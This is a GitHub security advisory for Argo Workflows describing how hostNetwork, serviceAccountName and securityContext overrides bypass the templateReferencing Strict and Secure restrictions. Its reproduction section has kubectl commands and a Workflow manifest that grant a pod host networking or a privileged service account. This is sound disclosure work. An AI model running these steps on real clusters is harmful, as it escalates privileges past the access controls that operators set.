# [H] Argo has incomplete fix for CVE-2026-31892: hostNetwork, securityContext, serviceAccountName bypass templateReferencing Strict/Secure

## Summary
Severity: High
Advisory: GHSA-3775-99mw-8rp4
CVE: CVE-2026-42296
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-3775-99mw-8rp4
Type: github-advisory

## Affected
- Go: `github.com/argoproj/argo-workflows/v3` — affected >=0 <3.7.14
- Go: `github.com/argoproj/argo-workflows/v4` — affected >=4.0.0 <4.0.5

## Details
The fix for CVE-2026-31892 (commit 534f4ff) blocks `podSpecPatch` when `templateReferencing: Strict` is active, but doesn't restrict other WorkflowSpec fields that flow through the same merge path and get applied to pods. A user can set `hostNetwork: true`, override `serviceAccountName`, or change `securityContext` on their Workflow while referencing a hardened template -- these survive `JoinWorkflowSpec` and get applied at pod creation.

The check in `setExecWorkflow` gates on `HasPodSpecPatch()` only:

```go
if woc.controller.Config.WorkflowRestrictions.MustUseReference() && woc.wf.Spec.HasPodSpecPatch() {
```

Everything else passes through. `createWorkflowPod` reads `hostNetwork`, `securityContext`, `serviceAccountName`, `tolerations`, and `automountServiceAccountToken` from the merged spec and applies them directly to the pod.

`JoinWorkflowSpec` constructs the merge target from the user's spec and applies the template as a patch -- user fields take priority. When the template doesn't explicitly set a field like `hostNetwork` (most won't -- `false` is the zero value and gets omitted), the user's `true` survives. For fields like `securityContext` and `serviceAccountName`, the template-level value takes precedence IF the template explicitly sets it. The bypass applies when the template relies on defaults.

Both `Strict` and `Secure` modes are affected. `Secure` stores the merged spec on first submission, so user overrides get baked into the stored spec and subsequent `MustNotChangeSpec` comparisons pass.

## Steps to reproduce

Tested on v4.0.2 (the CVE-2026-31892 patched version) on kind v0.27.0 / K8s v1.35.0.

```bash
# enable strict mode
kubectl patch configmap workflow-controller-configmap -n argo --type merge \
  -p '{"data":{"workflowRestrictions":"templateReferencing: Strict\n"}}'
kubectl rollout restart deployment workflow-controller -n argo
```

A template that lists network interfaces:

```bash
cat <<'EOF' | kubectl apply -n argo -f -
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: netcheck
spec:
  entrypoint: check
  templates:
  - name: check
    container:
      image: alpine:latest
      command: ["/bin/sh", "-c"]
      args: ["ip addr show | grep -E '^[0-9]+:' | cut -d: -f2"]
EOF
```

Submit a workflow with `hostNetwork: true`:

```bash
cat <<'EOF' | kubectl create -n argo -f -
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata:
  generateName: bypass-
spec:
  workflowTemplateRef:
    name: netcheck
  hostNetwork: true
EOF
```

Pod gets host networking:

```
$ kubectl get pod -n argo -l workflows.argoproj.io/workflow=bypass-bmg9b -o jsonpath='{.items[0].spec.hostNetwork}'
true
```

Container without the override sees `eth0@if20`. With the override, the pod sees the host's full network namespace -- all veth interfaces for other containers on the node.

`podSpecPatch` IS correctly blocked on the same cluster:

```
$ kubectl get workflow patched-check-jd272 -n argo -o jsonpath='{.status.message}'
podSpecPatch is not permitted when using workflowTemplateRef with templateReferencing restriction
```

`serviceAccountName` override also works -- a workflow with `serviceAccountName: argo-server` creates a pod running under the `argo-server` SA instead of the namespace default:

```
$ kubectl get pod -n argo -l workflows.argoproj.io/workflow=bypass-sa-slmjs -o jsonpath='{.items[0].spec.serviceAccountName}'
argo-server
```

Tested in Secure mode as well -- same result. Pod created with `hostNetwork: true` before the workflow errors on an unrelated permission issue.

## Impact

A user with `create Workflow` permission can bypass `templateReferencing: Strict` to get host network access, switch service accounts, override pod security context, add tolerations to schedule on control-plane nodes, or enable SA token mounting. This defeats the stated purpose of the feature.

The practical impact depends on what Kubernetes-level controls are in place. Clusters with PodSecurity admission or OPA/Gatekeeper would independently block some of these (like `hostNetwork`). Clusters that rely on Argo's Strict mode as the primary enforcement layer are fully exposed.

## Fix direction

The check in `setExecWorkflow` should cover all WorkflowSpec fields that influence pod security posture, not just `podSpecPatch`. The affected fields that I confirmed in `createWorkflowPod`: `hostNetwork`, `securityContext`, `serviceAccountName`, `automountServiceAccountToken`, `tolerations`, `dnsPolicy`, `schedulerName`, `hostAliases`, `volumes`.

An alternative approach: when `MustUseReference()` is true, strip all user-set WorkflowSpec fields except a known-safe allowlist (entrypoint, arguments, labels, annotations) before merging. This avoids a growing denylist as new fields get added.

## Affected versions

All versions supporting `templateReferencing`, including v4.0.2 and v3.7.11 which patched CVE-2026-31892.

## References
- https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3775-99mw-8rp4
- https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3wf5-g532-rcrr
- https://nvd.nist.gov/vuln/detail/CVE-2026-42296
- https://github.com/argoproj/argo-workflows/commit/2727f3f701677d467dfb5e053c57237cbc752c3c
- https://github.com/argoproj/argo-workflows/commit/534f4ff1cbd86908e8ff76d97d553ad5a49a950d
- https://github.com/argoproj/argo-workflows
- https://github.com/argoproj/argo-workflows/releases/tag/v3.7.14
- https://github.com/argoproj/argo-workflows/releases/tag/v4.0.5
